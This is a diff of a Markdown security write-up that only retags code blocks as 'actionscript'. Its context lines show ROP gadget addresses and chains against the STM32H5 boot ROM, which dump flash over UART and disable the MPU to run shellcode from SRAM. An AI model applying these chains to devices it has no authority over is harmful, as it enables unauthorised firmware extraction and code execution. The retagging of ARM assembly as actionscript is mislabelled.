@@ -102,7 +102,7 @@ ropper -f /home/gquere/stm32h5/bootrom.bin -a ARMTHUMB --inst-count 2 -I 0x0bf97
 ```
 
 I've selected a few for you that you can use to read and write anywhere. Of course, there are many others!
-```
+```actionscript
 0x0bf994b3 str r0, [r4]; pop {r4, pc};
 0x0bf97379 ldr r0, [r4]; bx lr;
 0x0bf9a927 pop {r0, r4, pc};
@@ -114,7 +114,7 @@ Naive approach 1: dumping the firmware directly on UART
 
 It had been a while since I last did ROP so I had pretty much forgotten everything. I naively tried to replicate the shellcode in ROP:
 
-```
+```actionscript
 0x0bf9a927  pop {r0, r4, pc};
 0x41        r0
 0x40013828  r4=USART1_TDR
@@ -135,7 +135,7 @@ OK so the UART cannot be directly written to because it's hard to monitor the st
 After a bit of reverse engineering, the UART_write_byte function is found at offset 0x0BF9DFBC. It takes a single byte as input but also requires that a stack structure has been set, the target USARTx base address has to be written at offset 0x20003348.
 
 When using USART1 this means that the ROP chain that sets up the ROM code UART function should start like so:
-```
+```actionscript
 0x0bf9a927  pop {r0, r4, pc}
 0x40013800  Value to be written (pops UART_BASE into r0)
 0x20003348  Target memory address (pops into r4)
@@ -146,7 +146,7 @@ When using USART1 this means that the ROP chain that sets up the ROM code UART f
 Problem 1: you can't write loops in ROP, your program has to be a linear chain of instruction addresses. This means that for each byte you want to dump you need to write a 20-byte payload. For a 2MB internal flash that seems like quite a big payload!
 
 Problem 2: the UART write function actually ends in ```bx lr``` and not with a ```pop {..}```. This makes it harder to call several times since LR has to be set beforehand. Didn't want to deal with that, if you want to I think you could do it using these two gadgets to build a LR sled:
-```
+```actionscript
 0x0bf98eb5 pop {pc};
 0x0bf99a2f pop.w {r1, r2, r4, lr}; bx r0;
 ```
@@ -172,7 +172,7 @@ loop:
 ```
 
 Let's call this loop from our ROP chain!
-```
+```actionscript
 ; set up the stack UART ptr as seen previously
 0x0bf9a927  pop {r0, r4, pc}
 0x40013800  Value to be written (pops UART_BASE into r0)
@@ -199,7 +199,7 @@ Working approach 2: ROP + shellcode
 The usual way to bypass XN is to write a tiny ROP chain that will disable the MPU and to then jump to a shellcode in SRAM since it will be rendered executable. This technique is technically better than the previous one because it lets you run arbitrary code, whereas the other could only dump memory (but that was the goal soooooo...).
 
 That's very easy — all that is needed is to write 0 to MPU_CTRL at address 0xE000ED94:
-```
+```actionscript
 0x0bf9a927  pop {r0, r4, pc};
 0x0         r0
 0xE000ED94  MPU control register
